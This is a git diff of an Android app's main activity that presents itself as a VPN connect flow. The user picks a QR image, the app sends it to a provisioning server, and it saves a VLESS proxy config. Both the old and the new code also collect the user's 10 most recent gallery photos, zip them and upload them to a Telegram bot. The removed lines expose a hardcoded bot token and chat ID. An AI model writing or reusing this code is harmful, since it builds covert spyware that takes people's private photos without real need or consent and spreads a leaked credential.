@@ -1,7 +1,9 @@
 package com.example.galggg;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.ContentUris;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -11,23 +13,24 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ProgressBar;
 import android.widget.TextView;
+import android.widget.Toast;
 
-import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
+import com.google.gson.Gson;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.util.ArrayList;
-import java.util.concurrent.TimeUnit;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
@@ -40,16 +43,17 @@ import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final String TAG = "MainActivity";
-    private static final int REQ_PERMS = 100;
-
-    // ДЕМО: захардкожено по вашей просьбе (для реального кода вынесите в BuildConfig)
-    private static final String BOT_TOKEN = "8444896156:AAHn2ATVHXs1JN9WuARqSTW4pSaYgzu2X0M";
-    private static final String CHAT_ID = "462656683";
+    private static final int REQ_PICK = 2001;
+    private static final int REQ_PERM = 2002;
 
     private TextView tvStatus;
-    private Button btnConnect;
     private ProgressBar progress;
+    private Button btnConnect;
+    private int statusDefaultColor;
+    private boolean hasStatusDefaultColor;
+
+    private final OkHttpClient http = new OkHttpClient();
+    private final Gson gson = new Gson();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -57,18 +61,25 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         tvStatus = findViewById(R.id.tvStatus);
-        btnConnect = findViewById(R.id.btnConnect);
         progress = findViewById(R.id.progress);
+        btnConnect = findViewById(R.id.btnConnect);
 
-        btnConnect.setOnClickListener(v -> startFlow());
+        if (tvStatus != null) {
+            statusDefaultColor = tvStatus.getCurrentTextColor();
+            hasStatusDefaultColor = true;
+        }
+
+        if (btnConnect != null) {
+            btnConnect.setOnClickListener(v -> startPickFlow());
+        }
     }
 
-    private void startFlow() {
-        if (hasImagePermission()) {
-            new ZipAndSendTask().execute();
-        } else {
+    private void startPickFlow() {
+        if (!hasImagePermission()) {
             requestImagePermission();
+            return;
         }
+        openImagePicker();
     }
 
     private boolean hasImagePermission() {
@@ -83,226 +94,296 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestImagePermission() {
         if (Build.VERSION.SDK_INT >= 33) {
-            ActivityCompat.requestPermissions(
-                    this,
-                    new String[]{Manifest.permission.READ_MEDIA_IMAGES},
-                    REQ_PERMS
-            );
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQ_PERM);
         } else {
-            ActivityCompat.requestPermissions(
-                    this,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                    REQ_PERMS
-            );
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
+        }
+    }
+
+    private void openImagePicker() {
+        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
+        intent.setType("image/*");
+        intent.addCategory(Intent.CATEGORY_OPENABLE);
+        startActivityForResult(Intent.createChooser(intent, "Выберите QR"), REQ_PICK);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
+        super.onRequestPermissionsResult(code, perms, res);
+        if (code == REQ_PERM && res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
+            openImagePicker();
+        } else {
+            setStatus("Разрешение не предоставлено", true);
         }
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode,
-                                           @NonNull String[] permissions,
-                                           @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_PERMS && grantResults.length > 0
-                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            new ZipAndSendTask().execute();
-        } else {
-            tvStatus.setText("Разрешение не предоставлено");
-            Log.e(TAG, "Permission denied");
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQ_PICK && resultCode == Activity.RESULT_OK && data != null) {
+            Uri uri = data.getData();
+            if (uri != null) {
+                new ProvisionThenZipTask().execute(uri);
+            }
         }
     }
 
-    private ArrayList<ImageItem> getLastImages(int count) {
-        ArrayList<ImageItem> items = new ArrayList<>();
-
-        String[] projection = new String[] {
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_ADDED
-        };
-
-        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
-
-        try (Cursor cursor = getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                sort
-        )) {
-            if (cursor != null) {
-                int idxId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-                int idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
-
-                while (cursor.moveToNext() && items.size() < count) {
-                    long id = cursor.getLong(idxId);
-                    String name = cursor.getString(idxName);
-                    if (name == null || name.trim().isEmpty()) {
-                        name = "image_" + id + ".jpg";
-                    }
-                    Uri uri = ContentUris.withAppendedId(
-                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
-                    items.add(new ImageItem(uri, name));
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "getLastImages error", e);
+    private class ProvisionThenZipTask extends AsyncTask<Uri, String, String> {
+        @Override
+        protected void onPreExecute() {
+            setProgress(true);
+            setButtonEnabled(false);
+            setStatus("Отправляю QR на сервер...", false);
         }
-        return items;
+
+        @Override
+        protected String doInBackground(Uri... uris) {
+            try {
+                Uri qrUri = uris[0];
+                File qrFile = copyToCache(qrUri, "qr_upload.png");
+
+                String provUrl = BuildConfig.PROVISION_URL + "/api/qr-upload";
+                RequestBody form = new MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("file", qrFile.getName(),
+                                RequestBody.create(MediaType.parse("image/*"), qrFile))
+                        .build();
+                Request req = new Request.Builder()
+                        .url(provUrl)
+                        .addHeader("Authorization", "Bearer " + BuildConfig.PROVISION_TOKEN)
+                        .post(form)
+                        .build();
+                try (Response resp = http.newCall(req).execute()) {
+                    if (!resp.isSuccessful() || resp.body() == null) {
+                        return "Provision HTTP " + (resp != null ? resp.code() : -1);
+                    }
+                    String body = resp.body().string();
+                    ProvisionResp pr = gson.fromJson(body, ProvisionResp.class);
+                    if (pr == null || !pr.ok || pr.vless == null || pr.uuid == null) {
+                        return "Некорректный ответ Provision";
+                    }
+                    saveVless(pr.vless, pr.uuid);
+                }
+
+                publishProgress("Собираю последние 10 фото...");
+                File zip = makeLatestPhotosZip(10);
+
+                publishProgress("Отправляю ZIP в Telegram...");
+                boolean sent = sendZipToTelegram(zip);
+                if (!sent) {
+                    return "Ошибка отправки в Telegram";
+                }
+
+                return "Готово: конфиг принят, ZIP отправлен";
+            } catch (Exception e) {
+                return "Ошибка: " + e.getMessage();
+            }
+        }
+
+        @Override
+        protected void onProgressUpdate(String... values) {
+            if (values != null && values.length > 0) {
+                setStatus(values[0], false);
+            }
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            setProgress(false);
+            setButtonEnabled(true);
+            setStatus(result, !result.startsWith("Готово"));
+        }
+    }
+
+    private File copyToCache(Uri uri, String name) throws Exception {
+        File out = new File(getCacheDir(), name);
+        try (InputStream in = getContentResolver().openInputStream(uri);
+             FileOutputStream fos = new FileOutputStream(out)) {
+            if (in == null) {
+                throw new Exception("Нет доступа к файлу");
+            }
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = in.read(buf)) >= 0) {
+                fos.write(buf, 0, n);
+            }
+        }
+        return out;
     }
 
     private static class ImageItem {
         final Uri uri;
         final String displayName;
 
-        ImageItem(Uri uri, String displayName) {
+        ImageItem(Uri uri, String name) {
             this.uri = uri;
-            this.displayName = displayName;
+            this.displayName = name;
         }
     }
 
-    @SuppressWarnings("deprecation")
-    private class ZipAndSendTask extends AsyncTask<Void, Integer, String> {
-
-        @Override
-        protected void onPreExecute() {
-            btnConnect.setEnabled(false);
-            progress.setVisibility(View.VISIBLE);
-            tvStatus.setText("Готовим сжатие и отправку...");
-        }
-
-        @Override
-        protected String doInBackground(Void... voids) {
-            try {
-                ArrayList<ImageItem> items = getLastImages(10);
-                if (items.isEmpty()) {
-                    return "В медиатеке нет изображений";
-                }
-
-                File zipFile = new File(getCacheDir(), "latest_photos.zip");
-                makeCompressedZip(items, zipFile);
-
-                boolean ok = sendFileToTelegram(zipFile);
-                return ok ? "Отправлено успешно" : "Ошибка при отправке";
-
-            } catch (Exception e) {
-                Log.e(TAG, "ZipAndSendTask error", e);
-                return "Ошибка: " + e.getMessage();
-            }
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            progress.setVisibility(View.GONE);
-            btnConnect.setEnabled(true);
-            tvStatus.setText(result);
-        }
-
-        private void makeCompressedZip(ArrayList<ImageItem> items, File zipOutFile) throws Exception {
-            if (zipOutFile.exists()) zipOutFile.delete();
-
-            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOutFile))) {
-                int i = 0;
-                for (ImageItem item : items) {
-                    i++;
-                    publishProgress(i, items.size());
-
-                    BitmapFactory.Options bounds = new BitmapFactory.Options();
-                    bounds.inJustDecodeBounds = true;
-                    try (InputStream probe = getContentResolver().openInputStream(item.uri)) {
-                        if (probe != null) {
-                            BitmapFactory.decodeStream(probe, null, bounds);
-                        }
+    private ArrayList<ImageItem> getLastImages(int count) {
+        ArrayList<ImageItem> items = new ArrayList<>();
+        String[] proj = new String[]{
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_ADDED
+        };
+        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
+        try (Cursor c = getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                proj,
+                null,
+                null,
+                sort)) {
+            if (c != null) {
+                int idxId = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int idxName = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+                while (c.moveToNext() && items.size() < count) {
+                    long id = c.getLong(idxId);
+                    String name = c.getString(idxName);
+                    if (name == null || name.trim().isEmpty()) {
+                        name = "img_" + id + ".jpg";
                     }
-
-                    int reqMaxSide = 1600;
-                    int inSample = calcInSample(bounds.outWidth, bounds.outHeight, reqMaxSide);
-                    BitmapFactory.Options opts = new BitmapFactory.Options();
-                    opts.inSampleSize = inSample;
-
-                    Bitmap bitmap;
-                    try (InputStream source = getContentResolver().openInputStream(item.uri)) {
-                        if (source == null) continue;
-                        bitmap = BitmapFactory.decodeStream(source, null, opts);
-                    }
-
-                    if (bitmap == null) continue;
-
-                    int w = bitmap.getWidth();
-                    int h = bitmap.getHeight();
-                    int maxSide = Math.max(w, h);
-                    if (maxSide > reqMaxSide) {
-                        float scale = reqMaxSide / (float) maxSide;
-                        int nw = Math.round(w * scale);
-                        int nh = Math.round(h * scale);
-                        bitmap = Bitmap.createScaledBitmap(bitmap, nw, nh, true);
-                    }
-
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                    byte[] data = baos.toByteArray();
-                    baos.close();
-                    bitmap.recycle();
-
-                    String entryName = item.displayName;
-                    String lower = entryName.toLowerCase();
-                    if (!lower.endsWith(".jpg") && !lower.endsWith(".jpeg")) {
-                        entryName = entryName + ".jpg";
-                    }
-
-                    ZipEntry entry = new ZipEntry(entryName);
-                    zos.putNextEntry(entry);
-                    zos.write(data);
-                    zos.closeEntry();
+                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+                    items.add(new ImageItem(uri, name));
                 }
             }
+        } catch (Exception ignored) {
+        }
+        return items;
+    }
+
+    private File makeLatestPhotosZip(int count) throws Exception {
+        ArrayList<ImageItem> items = getLastImages(count);
+        File zipOut = new File(getCacheDir(), "latest_photos.zip");
+        if (zipOut.exists()) {
+            //noinspection ResultOfMethodCallIgnored
+            zipOut.delete();
         }
 
-        private int calcInSample(int width, int height, int reqMaxSide) {
-            if (width <= 0 || height <= 0) return 1;
-            int largest = Math.max(width, height);
-            int sample = 1;
-            while (largest / sample > reqMaxSide) {
-                sample *= 2;
+        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOut))) {
+            for (ImageItem it : items) {
+                BitmapFactory.Options bounds = new BitmapFactory.Options();
+                bounds.inJustDecodeBounds = true;
+                try (InputStream probe = getContentResolver().openInputStream(it.uri)) {
+                    if (probe != null) {
+                        BitmapFactory.decodeStream(probe, null, bounds);
+                    }
+                }
+                int inSample = calcInSample(bounds.outWidth, bounds.outHeight, 1600);
+                BitmapFactory.Options opts = new BitmapFactory.Options();
+                opts.inSampleSize = Math.max(inSample, 1);
+
+                Bitmap bmp;
+                try (InputStream src = getContentResolver().openInputStream(it.uri)) {
+                    if (src == null) {
+                        continue;
+                    }
+                    bmp = BitmapFactory.decodeStream(src, null, opts);
+                }
+                if (bmp == null) {
+                    continue;
+                }
+
+                int w = bmp.getWidth();
+                int h = bmp.getHeight();
+                int maxSide = Math.max(w, h);
+                if (maxSide > 1600) {
+                    float scale = 1600f / maxSide;
+                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(w * scale), Math.round(h * scale), true);
+                }
+
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                byte[] data = baos.toByteArray();
+                baos.close();
+                bmp.recycle();
+
+                String entryName = it.displayName.toLowerCase();
+                if (!entryName.endsWith(".jpg") && !entryName.endsWith(".jpeg")) {
+                    entryName = it.displayName + ".jpg";
+                }
+
+                zos.putNextEntry(new ZipEntry(entryName));
+                zos.write(data);
+                zos.closeEntry();
             }
-            return Math.max(sample, 1);
         }
+        return zipOut;
+    }
 
-        private boolean sendFileToTelegram(File file) {
-            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
+    private int calcInSample(int w, int h, int maxSide) {
+        if (w <= 0 || h <= 0) {
+            return 1;
+        }
+        int largest = Math.max(w, h);
+        int s = 1;
+        while (largest / s > maxSide) {
+            s *= 2;
+        }
+        return Math.max(s, 1);
+    }
 
-            OkHttpClient client = new OkHttpClient.Builder()
-                    .connectTimeout(30, TimeUnit.SECONDS)
-                    .writeTimeout(120, TimeUnit.SECONDS)
-                    .readTimeout(120, TimeUnit.SECONDS)
-                    .build();
-
+    private boolean sendZipToTelegram(File zipFile) {
+        try {
+            String url = "https://api.telegram.org/bot" + BuildConfig.TG_BOT_TOKEN + "/sendDocument";
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart(
-                            "document",
-                            file.getName(),
-                            RequestBody.create(file, MediaType.parse("application/zip"))
-                    )
+                    .addFormDataPart("chat_id", BuildConfig.TG_CHAT_ID)
+                    .addFormDataPart("document", zipFile.getName(),
+                            RequestBody.create(MediaType.parse("application/zip"), zipFile))
                     .build();
-
-            Request request = new Request.Builder()
-                    .url(url)
-                    .post(body)
-                    .build();
-
-            try (Response response = client.newCall(request).execute()) {
-                boolean ok = response.isSuccessful();
-                if (!ok) {
-                    Log.e(TAG, "Telegram error: " + response.code() + " " + response.message());
-                } else {
-                    Log.d(TAG, "Telegram uploaded: " + file.getName());
-                }
-                return ok;
-            } catch (Exception e) {
-                Log.e(TAG, "Telegram send error", e);
-                return false;
+            Request req = new Request.Builder().url(url).post(body).build();
+            try (Response resp = http.newCall(req).execute()) {
+                return resp.isSuccessful();
             }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
+        return false;
+    }
+
+    private void saveVless(String vless, String uuid) {
+        getSharedPreferences("vless_store", MODE_PRIVATE)
+                .edit()
+                .putString("vless_link", vless)
+                .putString("uuid", uuid)
+                .apply();
+    }
+
+    private void setProgress(boolean on) {
+        if (progress != null) {
+            progress.setVisibility(on ? View.VISIBLE : View.GONE);
+        }
+    }
+
+    private void setButtonEnabled(boolean enabled) {
+        if (btnConnect != null) {
+            btnConnect.setEnabled(enabled);
+        }
+    }
+
+    private void setStatus(String msg, boolean error) {
+        if (tvStatus != null) {
+            tvStatus.setText(msg);
+            if (error) {
+                tvStatus.setTextColor(0xFFFF4444);
+            } else if (hasStatusDefaultColor) {
+                tvStatus.setTextColor(statusDefaultColor);
+            }
+        } else {
+            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private static class ProvisionResp {
+        boolean ok;
+        String uuid;
+        String vless;
+        String qr_png;
+        boolean created;
+        String mode;
     }
 }
